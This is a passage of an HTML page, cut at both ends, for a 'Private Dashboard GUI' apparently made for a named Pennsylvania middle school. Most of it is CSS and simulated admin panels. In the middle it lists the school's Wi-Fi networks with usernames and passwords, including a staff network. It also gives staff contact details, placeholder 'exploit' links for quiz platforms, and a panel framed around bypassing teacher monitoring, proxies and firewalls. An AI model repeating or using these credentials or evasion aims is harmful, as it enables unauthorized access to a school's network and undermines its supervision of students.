        transition: background 0.2s, transform 0.1s;
    }
    .network-scanner-panel .scan-controls button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }
    .network-scanner-panel .results-table {
        width: 100%;
        border-collapse: separate; /* For rounded corners */
        border-spacing: 0;
    }
    .network-scanner-panel .results-table th,
    .network-scanner-panel .results-table td {
        padding: 12px 15px;
        text-align: left;
        border: 1px solid rgba(40, 40, 40, 0.7);
        background: rgba(35, 35, 35, 0.7);
    }
    .network-scanner-panel .results-table th {
        background: rgba(50, 50, 50, 0.8);
        color: #ffbf80;
        font-weight: 700;
        text-shadow: 0 0 5px rgba(255, 191, 128, 0.4);
        border-bottom-width: 2px;
    }
    .network-scanner-panel .results-table tr:nth-child(even) td {
        background: rgba(30, 30, 30, 0.7);
    }
    .network-scanner-panel .results-table td.status-online { color: #4CAF50; } /* Green */
    .network-scanner-panel .results-table td.status-offline { color: #f44336; } /* Red */
    .network-scanner-panel .results-table td.status-unknown { color: #ff9800; } /* Orange */

    /* Security Suite Panel */
    .security-suite-panel .scan-controls,
    .user-manager-panel .action-buttons,
    .log-viewer-panel .log-controls {
        display: flex;
        justify-content: center;
        gap: 15px;
        margin-bottom: 25px;
        flex-wrap: wrap;
    }
    .security-suite-panel .scan-controls button,
    .user-manager-panel .action-buttons button,
    .log-viewer-panel .log-controls button {
        padding: 10px 20px;
        background-color: #ff914d;
        color: #0a0a0a;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
    }
    .security-security-suite-panel .scan-controls button:hover,
    .user-manager-panel .action-buttons button:hover,
    .log-viewer-panel .log-controls button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }
    .security-suite-panel .scan-results,
    .user-manager-panel .user-list,
    .log-viewer-panel .log-entries {
        background: rgba(40, 40, 40, 0.6);
        padding: 20px;
        border-radius: 12px;
        height: 300px; /* Fixed height for scrollable area */
        overflow-y: auto;
        border: 1px solid rgba(255, 145, 77, 0.1);
    }
    .security-suite-panel .scan-item,
    .user-manager-panel .user-item,
    .log-viewer-panel .log-entry {
        padding: 10px 15px;
        margin-bottom: 8px;
        border-radius: 8px;
        border-left: 4px solid #ff914d;
        background: rgba(45, 45, 45, 0.8);
        font-size: 0.95em;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .security-suite-panel .scan-item.threat,
    .user-manager-panel .user-item.admin,
    .log-viewer-panel .log-entry.error {
        border-left-color: #ff4c4c;
        background: rgba(60, 20, 20, 0.8);
    }
    .security-suite-panel .scan-item.clean,
    .user-manager-panel .user-item.user,
    .log-viewer-panel .log-entry.info {
        border-left-color: #4CAF50;
        background: rgba(20, 60, 20, 0.8);
    }
    .log-viewer-panel .log-entry {
        font-family: 'Courier New', monospace;
        font-size: 0.9em;
        flex-wrap: wrap; /* Allow log parts to wrap */
    }
    .log-viewer-panel .log-entry span {
        margin-right: 15px;
        white-space: nowrap; /* Prevent timestamp/level from wrapping */
    }
    .log-viewer-panel .log-entry .level { font-weight: bold; }
    .log-viewer-panel .log-entry .message {
        flex-grow: 1;
        word-break: break-all; /* Break long log messages */
        margin-top: 5px; /* Space for wrapped messages */
        flex-basis: 100%; /* Ensure message takes full width on wrap */
    }

    /* Data Analyst Panel */
    .data-analyst-panel .chart-container {
        background: rgba(40, 40, 40, 0.6);
        padding: 25px;
        border-radius: 12px;
        border: 1px solid rgba(255, 145, 77, 0.1);
        min-height: 350px; /* Placeholder height */
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 1.2em;
        color: #aaa;
        text-shadow: 0 0 8px rgba(255, 255, 255, 0.3);
    }
    .data-analyst-panel .data-controls {
        margin-top: 20px;
        text-align: center;
    }
    .data-analyst-panel .data-controls button {
        padding: 10px 20px;
        background-color: #ff914d;
        color: #0a0a0a;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
        margin: 0 5px;
    }
    .data-analyst-panel .data-controls button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }

    /* User Manager Panel */
    .user-manager-panel .user-item {
        background: rgba(45, 45, 45, 0.8);
        padding: 15px 20px;
        margin-bottom: 12px;
        border-radius: 10px;
        border-left: 4px solid #ff914d;
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 1em;
    }
    .user-manager-panel .user-item .user-name {
        font-weight: bold;
        color: #ffbf80;
        flex-grow: 1;
        margin-right: 15px;
    }
    .user-manager-panel .user-item .user-role {
        font-style: italic;
        color: #c0c0c0;
        font-size: 0.9em;
        margin-right: 15px;
    }
    .user-manager-panel .user-item .user-actions button {
        background: none;
        border: none;
        color: #aaa;
        font-size: 1.2em;
        cursor: pointer;
        transition: color 0.2s;
        margin-left: 10px;
    }
    .user-manager-panel .user-item .user-actions button:hover {
        color: #ff4c4c;
    }
    .user-manager-panel .user-item.admin {
        border-left-color: #4CAF50; /* Green for admin */
    }
    .user-manager-panel .user-item.admin .user-role {
        color: #4CAF50;
    }

    /* Communication Hub Panel */
    .communication-hub-panel .hub-links {
        display: grid;
        grid-template-columns: repeat(3, 1fr); /* 3 columns for links */
        gap: 15px;
    }
    .communication-hub-panel .hub-links a {
        background: rgba(40, 40, 40, 0.6);
        padding: 15px 20px;
        border-radius: 10px;
        color: #ffccb3;
        text-decoration: none;
        font-weight: bold;
        text-align: center;
        display: block;
        transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
    }
    .communication-hub-panel .hub-links a:hover {
        background: #4a4a4a;
        transform: translateY(-2px);
        box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
    }

    /* System Config Panel */
    .system-config-panel .config-section {
        margin-bottom: 20px;
        padding: 15px;
        background: rgba(40, 40, 40, 0.6);
        border-radius: 10px;
        border: 1px solid rgba(255, 145, 77, 0.1);
    }
    .system-config-panel .config-section h4 {
        font-size: 1.1em;
        color: #ffbf80;
        margin-bottom: 10px;
        border-bottom: 1px solid #4a3a2a;
        padding-bottom: 5px;
    }
    .system-config-panel .config-item {
        margin-bottom: 10px;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .system-config-panel .config-item label {
        flex-basis: 150px; /* Fixed label width */
        color: #e0e0e0;
    }
    .system-config-panel .config-item input[type="text"],
    .system-config-panel .config-item input[type="number"] {
        flex-grow: 1;
        padding: 8px 12px;
        background: rgba(30, 30, 30, 0.7);
        border: 1px solid rgba(255, 145, 77, 0.3);
        color: #e0e0e0;
        border-radius: 6px;
        font-size: 0.95em;
    }
    .system-config-panel .config-item input[type="checkbox"] {
        accent-color: #ff914d;
        width: 16px;
        height: 16px;
        cursor: pointer;
    }

    /* Resource Allocator Panel */
    .resource-allocator-panel .resource-item {
        margin-bottom: 15px;
        padding: 10px 15px;
        background: rgba(40, 40, 40, 0.6);
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 15px;
    }
    .resource-allocator-panel .resource-item label {
        color: #e0e0e0;
        font-size: 1em;
        flex-basis: 150px;
    }
    .resource-allocator-panel .resource-item .slider-container {
        flex-grow: 1;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .resource-allocator-panel .resource-item .slider-container input[type="range"] {
        flex-grow: 1;
        cursor: pointer;
    }
    .resource-allocator-panel .resource-item .value {
        font-weight: bold;
        color: #ffbf80;
        min-width: 40px; /* Ensure space for value */
        text-align: right;
    }

    /* Diagnostic Tools Panel */
    .diagnostic-tools-panel .tool-button {
        padding: 12px 20px;
        background-color: #ff914d;
        color: #0a0a0a;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        font-size: 1em;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
        margin: 5px;
    }
    .diagnostic-tools-panel .tool-button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
        box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
    }
    .diagnostic-tools-panel .tool-results {
        margin-top: 20px;
        background: rgba(40, 40, 40, 0.6);
        padding: 15px 20px;
        border-radius: 10px;
        min-height: 100px;
        border: 1px solid rgba(255, 145, 77, 0.1);
        color: #ffccb3;
        font-family: 'Courier New', monospace;
        font-size: 0.95em;
        overflow-y: auto;
        white-space: pre-wrap; /* Preserve formatting from JS logs */
    }

    /* AI Assistant Panel */
    .ai-assistant-panel .chat-container {
        background: rgba(40, 40, 40, 0.6);
        padding: 20px;
        border-radius: 12px;
        height: 400px; /* Fixed height */
        overflow-y: auto;
        display: flex;
        flex-direction: column;
        gap: 15px;
        border: 1px solid rgba(255, 145, 77, 0.1);
    }
    .ai-assistant-panel .message {
        padding: 10px 15px;
        border-radius: 8px;
        max-width: 70%;
        line-height: 1.5;
        word-wrap: break-word; /* Break long words */
    }
    .ai-assistant-panel .user-message {
        background: #ff914d; /* Orange for user */
        color: #0a0a0a;
        align-self: flex-end; /* User messages on the right */
        margin-left: auto; /* Pushes to right */
    }
    .ai-assistant-panel .assistant-message {
        background: rgba(50, 50, 50, 0.8); /* Darker grey for assistant */
        color: #f0f0f0;
        align-self: flex-start; /* Assistant messages on the left */
    }
    .ai-assistant-panel .input-area {
        margin-top: 20px;
        display: flex;
        gap: 10px;
    }
    .ai-assistant-panel .input-area input[type="text"] {
        flex-grow: 1;
        padding: 12px 15px;
        background: rgba(30, 30, 30, 0.7);
        border: 1px solid rgba(255, 145, 77, 0.3);
        color: #e0e0e0;
        border-radius: 8px;
        font-size: 1em;
    }
    .ai-assistant-panel .input-area button {
        padding: 12px 20px;
        background-color: #ff914d;
        color: #0a0a0a;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
    }
    .ai-assistant-panel .input-area button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }

    /* File Manager Panel */
    .file-manager-panel .fm-container {
        display: flex;
        gap: 20px;
        height: 400px;
    }
    .file-manager-panel .file-tree {
        width: 30%;
        background: rgba(40, 40, 40, 0.6);
        padding: 15px;
        border-radius: 10px;
        overflow-y: auto;
        border: 1px solid rgba(255, 145, 77, 0.1);
    }
    .file-manager-panel .file-list {
        width: 70%;
        background: rgba(45, 45, 45, 0.8);
        padding: 15px;
        border-radius: 10px;
        overflow-y: auto;
        border: 1px solid rgba(255, 145, 77, 0.1);
    }
    .file-manager-panel .file-item {
        padding: 8px 12px;
        margin-bottom: 5px;
        border-radius: 6px;
        font-size: 0.95em;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .file-manager-panel .file-item:hover {
        background: #5a5a5a;
        transform: translateX(5px);
    }
    .file-manager-panel .file-item.folder {
        font-weight: bold;
        color: #ffbf80;
    }
    .file-manager-panel .file-item.file {
        color: #ffccb3;
    }
    .file-manager-panel .file-item i { /* Placeholder for icons */
        font-size: 1.2em;
    }
    .file-manager-panel .file-tree .folder-name {
        margin-left: 10px;
    }

    /* Process Viewer Panel */
    .process-viewer-panel .process-table {
        width: 100%;
        border-collapse: separate;
        border-spacing: 0;
    }
    .process-viewer-panel .process-table th,
    .process-viewer-panel .process-table td {
        padding: 10px 15px;
        text-align: left;
        border: 1px solid rgba(40, 40, 40, 0.7);
        background: rgba(35, 35, 35, 0.7);
    }
    .process-viewer-panel .process-table th {
        background: rgba(50, 50, 50, 0.8);
        color: #ffbf80;
        font-weight: 700;
        text-shadow: 0 0 5px rgba(255, 191, 128, 0.4);
        border-bottom-width: 2px;
    }
    .process-viewer-panel .process-table tr:nth-child(even) td {
        background: rgba(30, 30, 30, 0.7);
    }
    .process-viewer-panel .process-table .process-name {
        font-weight: bold;
        color: #ffccb3;
    }
    .process-viewer-panel .process-table .process-details {
        font-size: 0.9em;
        color: #c0c0c0;
    }
    .process-viewer-panel .process-actions {
        text-align: center;
        margin-top: 20px;
    }
    .process-viewer-panel .process-actions button {
        padding: 8px 15px;
        background-color: #ff914d;
        color: #0a0a0a;
        border: none;
        border-radius: 6px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
        margin: 0 5px;
    }
    .process-viewer-panel .process-actions button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }

    /* Zoom Controls */
    .zoom-controls {
        position: fixed;
        bottom: 20px;
        left: 20px;
        z-index: 500; /* Below notifications */
        display: flex;
        gap: 10px;
    }
    .zoom-controls button {
        background: rgba(40, 40, 40, 0.7);
        color: #f0f0f0;
        border: 1px solid rgba(255, 145, 77, 0.2);
        border-radius: 8px;
        padding: 8px 12px;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
        font-size: 1.1em;
        font-weight: bold;
        min-width: 40px;
        text-align: center;
    }
    .zoom-controls button:hover {
        background: #5a5a5a;
        transform: translateY(-2px);
        box-shadow: 0 0 10px rgba(255, 145, 77, 0.3);
    }
    
  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class=""> <!-- Start with empty class, JS will add dashboard-body or login-body -->

  <!-- Loader Section -->
  <div id="loader">
    <div class="loader-stage stage-1">Initializing System...</div>
    <div class="loader-stage stage-2">Key System</div>
    <div class="loader-stage stage-3">Dashboard</div>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox" style="display: none;">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="Enter Reset Code" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Guest</span> | ID: <span id="loggedInID">000000</span></div>
      </div>
      <div class="version-box">Version 1.8.2</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
      <button id="settingsBtn">⚙️ Settings</button>
    </div>
    
    <!-- Announcement Bar -->
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Security Alert: Unusual login activity detected from a new IP. Please review logs immediately! 🚨</span>
    </div>
    
    <!-- Main Dashboard Content -->
    <div class="main-row" id="mainGrid">
      
      <div class="box">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "The best way to predict the future is to create it." – Peter Drucker
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 25px; justify-content: center; flex-wrap: wrap; margin-top: 30px;">
      <div class="box" style="flex: 1 1 300px;">
        <h2>🔄 System Updates</h2>
        <div class="update-entry">v1.8.2: Enhanced security protocols and UI optimizations.</div>
        <div class="update-entry">v1.8.1: New AI Assistant features integrated.</div>
        <div class="update-entry">v1.8.0: Major overhaul of system panels and controls.</div>
        <div class="update-entry">v1.7.5: Performance improvements for large data sets.</div>
        <div class="update-entry">v1.7.0: Added Reminders and enhanced Notifications.</div>
      </div>

      <div class="box" style="flex: 1 1 300px;">
        <h2>🔔 System Notifications</h2>
        <p>User 'Admin' successfully logged in from 192.168.1.100.</p>
        <p>Security scan completed: No threats found.</p>
        <p>Reminder set: 'Review quarterly reports' for Friday.</p>
        <p>Network scan initiated for subnet 192.168.1.0/24.</p>
        <p>CPU usage is currently at 65%.</p>
      </div>
    </div>

    <!-- Main Controls Section -->
    <div class="main-controls-bar">
        <button onclick="dashboard.togglePanel('systemMonitorPanel')">📊 System Monitor</button>
        <button onclick="dashboard.togglePanel('networkScannerPanel')">🌐 Network Scanner</button>
        <button onclick="dashboard.togglePanel('securitySuitePanel')">🛡️ Security Suite</button>
        <button onclick="dashboard.togglePanel('dataAnalystPanel')">📈 Data Analyst</button>
        <button onclick="dashboard.togglePanel('userManagerPanel')">👥 User Manager</button>
        <button onclick="dashboard.togglePanel('communicationHubPanel')">✉️ Communication Hub</button>
        <button onclick="dashboard.togglePanel('systemConfigPanel')">⚙️ System Config</button>
        <button onclick="dashboard.togglePanel('resourceAllocatorPanel')">⚡ Resource Allocator</button>
        <button onclick="dashboard.togglePanel('diagnosticToolsPanel')">🔍 Diagnostic Tools</button>
        <button onclick="dashboard.togglePanel('aiAssistantPanel')">🤖 AI Assistant</button>
        <button onclick="dashboard.togglePanel('logViewerPanel')">📜 Log Viewer</button>
        <button onclick="dashboard.togglePanel('fileManagerPanel')">📂 File Manager</button>
        <button onclick="dashboard.togglePanel('processViewerPanel')">🖥️ Process Viewer</button>
    </div>

    <!-- Informational Panels Container -->
    <div id="infoPanelsContainer" class="main-row">
      
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div><div>Signal</div><div>Security</div><div>Auth</div><div>Hidden</div><div>Monitored</div><div>User</div><div>Pass</div>
        </div>
        <div class="wifi-entry"><div>Middletown_Core</div><div>High</div><div>WPA3</div><div>Enterprise</div><div>No</div><div>Yes</div><div>Unknown</div><div>Unknown</div></div>
        <div class="wifi-entry"><div>Mtown_Core</div><div>High</div><div>WPA3</div><div>Enterprise</div><div>Yes</div><div>Unknown</div><div>Unknown</div><div>Unknown</div></div>
        <div class="wifi-entry"><div>Mtown Guest</div><div>Medium</div><div>WPA3</div><div>Enterprise</div><div>No</div><div>Rare</div><div>msguest</div><div>M@ms2021#</div></div>
        <div class="wifi-entry"><div>Radius Test</div><div>Low</div><div>WPA3</div><div>Enterprise</div><div>No</div><div>Rarely</div><div>guest</div><div>test123</div></div>
        <div class="wifi-entry"><div>EduNet_Staff</div><div>High</div><div>WPA2</div><div>PSK</div><div>No</div><div>Yes</div><div>staff</div><div>#StaffPass!</div></div>
        <div class="wifi-entry"><div>EduNet_Guest</div><div>Medium</div><div>WPA2</div><div>Open</div><div>No</div><div>Rare</div><div>guest</div><div>EduGuest2024</div></div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        <div id="ipadRestrictions" class="ipad-content"><p>iPadOS 17 enforced restrictions on app installations and web browsing.</p></div>
        <div id="ipadBypasses" class="ipad-content"><p>Exploiting bypasses is monitored and logged.</p></div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks</h2>
        <div class="handbook-buttons">
          <a href="#" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="#" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="#" target="_blank">District Handbook</a>
          <a href="#" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="#" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="#" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map</h2>
        <div class="coming-soon">
          Interactive Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Websites</h2>
        <div class="links-list">
          <a href="#" target="_blank">RaiderWeb</a>
          <a href="#" target="_blank">Canvas Login</a>
          <a href="#" target="_blank">Clever Login</a>
          <a href="#" target="_blank">EasyBridge</a>
          <a href="#" target="_blank">FitnessGram</a>
          <a href="#" target="_blank">Naviance</a>
          <a href="#" target="_blank">Destiny Library</a>
          <a href="#" target="_blank">PowerSchool</a>
          <a href="#" target="_blank">Safe2Say</a>
          <a href="#" target="_blank">Gmail</a>
          <a href="#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites</h2>
        <div class="links-list">
          <a href="#" target="_blank">Acadience Learning</a>
          <a href="#" target="_blank">AIMSweb Plus</a>
          <a href="#" target="_blank">ERP Linq</a>
          <a href="#" target="_blank">Barracuda</a>
          <a href="#" target="_blank">Canvas (Teacher)</a>
          <a href="#" target="_blank">Clever (Teacher)</a>
          <a href="#" target="_blank">Discovery Education</a>
          <a href="#" target="_blank">EasyBridge (Teacher)</a>
          <a href="#" target="_blank">FMX</a>
          <a href="#" target="_blank">Frontline</a>
          <a href="#" target="_blank">LinkIt! (Teacher)</a>
          <a href="#" target="_blank">Naviance</a>
          <a href="#" target="_blank">PowerSchool (Teacher)</a>
          <a href="#" target="_blank">SchoolMessenger</a>
          <a href="#" target="_blank">PBIS Apps</a>
          <a href="#" target="_blank">HappyFox</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory</h2>
        <div class="coming-soon">
          Directory Information Unavailable
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Feeds</h2>
        <div class="coming-soon">
          Camera Feed Access Restricted
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div><div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Address:</div><div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Main Phone:</div><div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Fax:</div><div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal:</div><div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div><div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div><div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div><div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Asst. Principal's Phone:</div><div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Asst. Principal's Email:</div><div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="#" target="_blank">Blooket Exploit</a>
          <a href="#" target="_blank">Kahoot Exploit</a>
          <a href="#" target="_blank">Gimkit Exploit</a>
          <a href="#" target="_blank">Quizlet Exploit</a>
          <a href="#" target="_blank">Quizzes Exploit</a>
          <a href="#" target="_blank">Quills Exploit</a>
          <a href="#" target="_blank">Edpuzzle Exploit</a>
          <a href="#" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('proxy')">Proxy Bypass</button>
          <button onclick="dashboard.showBypassContent('firewall')">Firewall Bypass</button>
          <button onclick="dashboard.showBypassContent('download')">Download Bypass</button>
        </div>
        <div id="bathroomBypass" class="bypass-content"><p>Accessing restroom facilities requires proper authorization.</p></div>
        <div id="wifiBypass" class="bypass-content"><p>Use the School WiFi Information panel for network details.</p></div>
        <div id="monitoringBypass" class="bypass-content"><p>Teacher monitoring is active. Use caution.</p></div>
        <div id="proxyBypass" class="bypass-content"><p>Proxy settings can be adjusted in System Config.</p></div>
        <div id="firewallBypass" class="bypass-content"><p>Firewall rules are managed by network administrators.</p></div>
        <div id="downloadBypass" class="bypass-content"><p>File download protocols must be followed.</p></div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="#" target="_blank">FastVPN</a>
          <a href="#" target="_blank">SecureSurf VPN</a>
          <a href="#" target="_blank">ZenVPN</a>
          <a href="#" target="_blank">NinjaVPN</a>
          <a href="#" target="_blank">GlobalShield</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          Gaming Portal Under Development
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          Music Streaming Access Restricted
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 System Keyboard Shortcuts</h2>
        <div class="info-text">
          <p><strong>General Navigation:</strong></p>
          <p>• Spotlight Search: ⌘ + Space</p>
          <p>• Return to Home: ⌘ + H</p>
          <p>• Show App Library: ⇧ + ⌃ + A</p>
          <p>• Open Quick Note: ⌃ + Q</p>
          <p>• Open Siri: ⌃ + S</p>
          <p>• App Switcher: ⌃ + ↑</p>
          <p><strong>Safari & Apps:</strong></p>
          <p>• New Tab: ⌘ + T</p>
          <p>• Close Tab: ⌘ + W</p>
          <p>• Reopen Tab: ⇧ + ⌘ + T</p>
          <p>• Private Tab: ⌘ + ⇧ + N</p>
          <p>• Go to Tab 1-8: ⌘ + 1-8</p>
          <p>• Go to Last Tab: ⌘ + 9</p>
          <p><strong>Text Editing:</strong></p>
          <p>• Select All: ⌘ + A</p>
          <p>• Copy: ⌘ + C</p>
          <p>• Paste: ⌘ + V</p>
          <p>• Undo: ⌘ + Z</p>
          <p>• Redo: ⇧ + ⌘ + Z</p>
          <p><strong>Full list:</strong> Press and hold the Command (⌘) key in most applications.</p>
        </div>
      </div>

      <!-- NEW PANELS -->

      <!-- System Monitor Panel -->
      <div id="systemMonitorPanel" class="info-panel system-monitor-panel">
          <h2>📊 System Resource Monitor</h2>
          <div class="stat-group">
              <label class="stat-label">CPU Usage</label>
              <div class="progress-bar-container">
                  <div class="progress-bar" id="cpuUsageBar">0%</div>
              </div>
          </div>
          <div class="stat-group">
              <label class="stat-label">Memory Usage (RAM)</label>
              <div class="progress-bar-container">
                  <div class="progress-bar" id="ramUsageBar">0%</div>
              </div>
          </div>
          <div class="stat-group">
              <label class="stat-label">Disk Usage (C:)</label>
              <div class="progress-bar-container">
                  <div class="progress-bar" id="diskUsageBar">0%</div>
              </div>
          </div>
          <div class="stat-group">
              <label class="stat-label">Network Activity</label>
              <div class="progress-bar-container">
                  <div class="progress-bar" id="networkActivityBar">0 Mbps</div>
              </div>
          </div>
      </div>

      <!-- Network Scanner Panel -->
      <div id="networkScannerPanel" class="info-panel network-scanner-panel">
          <h2>🌐 Network Scanner</h2>
          <div class="scan-controls">
              <input type="text" id="networkTarget" placeholder="Enter IP Range or Subnet (e.g., 192.168.1.0/24)" />
              <button id="startScanBtn">Start Scan</button>
          </div>
          <div class="results-table-wrapper">
              <table class="results-table">
                  <thead>
                      <tr>
                          <th>IP Address</th>
                          <th>Hostname</th>
                          <th>Status</th>
                          <th>MAC Address</th>
                          <th>Vendor</th>
                      </tr>
                  </thead>
                  <tbody id="networkScanResults">
                      <!-- Scan results will be populated here -->
                      <tr><td colspan="5" style="text-align: center; color: #aaa;">Scan results will appear here.</td></tr>
                  </tbody>
              </table>
          </div>
      </div>

      <!-- Security Suite Panel -->
      <div id="securitySuitePanel" class="info-panel security-suite-panel">
          <h2>🛡️ Security Suite</h2>
          <div class="scan-controls">
              <button id="quickScanBtn">Quick Scan</button>
              <button id="fullScanBtn">Full System Scan</button>
              <button id="updateDefsBtn">Update Definitions</button>
          </div>
          <div class="scan-results" id="securityScanResults">
              <h3>Scan Log:</h3>
              <div class="scan-item clean"><span>[INFO] Definitions Updated. Ready for scan.</span></div>
              <div class="scan-item clean"><span>[INFO] Quick Scan completed. No threats detected.</span></div>
          </div>
      </div>

      <!-- Data Analyst Panel -->
      <div id="dataAnalystPanel" class="info-panel data-analyst-panel">
          <h2>📈 Data Analysis Suite</h2>
          <div class="chart-container">
              <p>Visualize System Data Here...</p>
              <!-- Placeholder for charts (e.g., using Chart.js) -->
          </div>
          <div class="data-controls">
              <button>Load Sample Data 1</button>
              <button>Load Sample Data 2</button>
              <button>Generate Report</button>
          </div>
      </div>

      <!-- User Manager Panel -->
      <div id="userManagerPanel" class="info-panel user-manager-panel">
          <h2>👥 User Management</h2>
          <div class="action-buttons">
              <button>Add New User</button>
              <button>Edit Selected</button>
